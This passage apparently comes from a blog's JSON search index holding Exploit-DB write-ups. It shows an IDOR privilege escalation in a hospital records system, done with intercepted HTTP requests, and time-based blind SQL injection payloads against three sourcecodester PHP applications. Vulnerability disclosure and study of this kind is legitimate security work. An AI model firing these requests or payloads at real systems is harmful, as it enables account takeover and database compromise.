Step-2: Modify the username,lastname and password,then let’s intercept the request using burpsuite:   POST /hprms/classes/Users.php?f=save HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------17632878732301879013646251239 Content-Length: 806 Origin: http://localhost Connection: close Referer: http://localhost/hprms/admin/?page=user Cookie: PHPSESSID=32kl57ct3p8nsicsrp8dte2c50 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin  -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"id\"  4 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"firstname\"  user1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"lastname\"  admin -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"username\"  admin1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"password\"  admin1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"img\"; filename=\"\" Content-Type: application/octet-stream   -----------------------------17632878732301879013646251239--      Step-3: Change parameter id ‘4’ to id ‘1’   POST /hprms/classes/Users.php?f=save HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------17632878732301879013646251239 Content-Length: 806 Origin: http://localhost Connection: close Referer: http://localhost/hprms/admin/?page=user Cookie: PHPSESSID=32kl57ct3p8nsicsrp8dte2c50 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin  -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"id\"  1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"firstname\"  user1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"lastname\"  admin -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"username\"  admin1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"password\"  admin1 -----------------------------17632878732301879013646251239 Content-Disposition: form-data; name=\"img\"; filename=\"\" Content-Type: application/octet-stream   -----------------------------17632878732301879013646251239--      step-4: Click ‘Forward’ on burpsuite. Now user1 is a Administrator.  ","categories": ["Exploit-DB"],
        "tags": ["Exploit-DB"],
        "url": "http://localhost:4000/exploit-db/hprmsv1-0-idor/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },{
        "title": "Hospitals Patient Records Management System 1.0 - 'id' SQL Injection (Authenticated)",
        "excerpt":"Information about vulnerability  - Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated) - Date: 2021-12-30 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip - Version: v1.0 - Tested on: Kali Linux 2021.4 - Exploit-DB link: https://www.exploit-db.com/exploits/50630   SQL Injection  SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Hospital’s Patient Records Management System v1.0 is vulnerable to SQL injection via the ‘id’ parameter on the patient list.   Attack Vector  An attacker can compromise the database of the application using some automated(or manual) tools like SQLmap.   Steps of reproduce          Step-1: On the dashboard navigate to ‘Patient List’, then go to ‘Action’ &gt; ‘View Records’ page using the following URL: http://localhost/hprms/admin/?page=patients/view_patient&amp;id=1            Step-2: Put the SQL Injection payloads in ‘id’ field. time-based blind payload : page=patients/view_patient&amp;id=1' AND (SELECT 2664 FROM (SELECT(SLEEP(5)))ixec) AND 'XcAY'='XcAY            Step-3: Now, the Server target accepted our payload and the response got delayed by 5 seconds.      ","categories": ["Exploit-DB"],
        "tags": ["Exploit-DB"],
        "url": "http://localhost:4000/exploit-db/hprmsv1.0-sql-injection/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },{
        "title": "Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection",
        "excerpt":"Information about vulnerability  - Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection - Date: 05/01/20222 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15119/online-veterinary-appointment-system-using-phpoop-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/ovas.zip - Version: v1.0 - Tested on: Kali Linux 2021.4 - Exploit-DB: https://www.exploit-db.com/exploits/50644   SQL Injection  SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Online Veterinary Appointment System 1.0 is vulnerable to ‘Multiple’ SQL injections.   Attack Vector  An attacker can compromise the database of the application using some automated(or manual) tools like SQLmap.      Appointment Requests - Vulnerable Parameter(s): id Steps of reproduce:            Step-1: On the dashboard navigate to ‘Appointment Requests’ page using the following URL: http://localhost/ovas/admin/?page=appointments, then go to ‘Action’ &gt; ‘View’.       Step-2: Put the SQL Injection payloads in ‘id’ field. time-based blind payload : page=appointments/view_details&amp;id=1' AND (SELECT 2197 FROM (SELECT(SLEEP(5)))DZwi) AND 'mQQq'='mQQq       Step-3: Now, the Server target accepted our payload and the response got delayed by 5 seconds.           Read more here  ","categories": ["Exploit-DB"],
        "tags": ["Exploit-DB"],
        "url": "http://localhost:4000/exploit-db/ovas-v1.0-multiple-sql-injection/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },{
        "title": "Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated)",
        "excerpt":"Information about vulnerability  - Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated) - Date: 07/01/2022 - Exploit Author: twseptian - Vendor Homepage: https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html - Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/orrs.zip - Version: v1.0 - Tested on: Kali Linux 2021.4,PHP 7.4.26 - Exploit-DB: https://www.exploit-db.com/exploits/50646   SQL Injection  SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to it’s database. Online Railway Reservation System v1.0 is vulnerable to SQL injection via the ‘id’ parameter on the Reservation Form.   Attack Vector  An attacker can compromise the database of the application using some automated(or manual) tools like SQLmap.   Steps of reproduce          Step-1: Navigate to ‘Schedule’ &gt; go to ‘Book’ or ‘Revervation Form’ page using the following URL: http://localhost/orrs/?page=reserve&amp;sid=1            Step-2: Put the SQL Injection payloads in ‘id’ field. In this we used time-based blind payload: /orrs/?page=reserve&amp;sid=1') AND (SELECT 6842 FROM (SELECT(SLEEP(5)))UsWr) AND ('WBCm'='WBCm            Step-3: Now, the Server target accepted our payload and the response got delayed by 5 seconds.      ","categories": ["Exploit-DB"],
        "tags": ["Exploit-DB"],
        "url": "http://localhost:4000/exploit-db/orrsv1.0-sql-injection/",
        "teaser": "http://localhost:4000/assets/images/teaser.png"
      },]
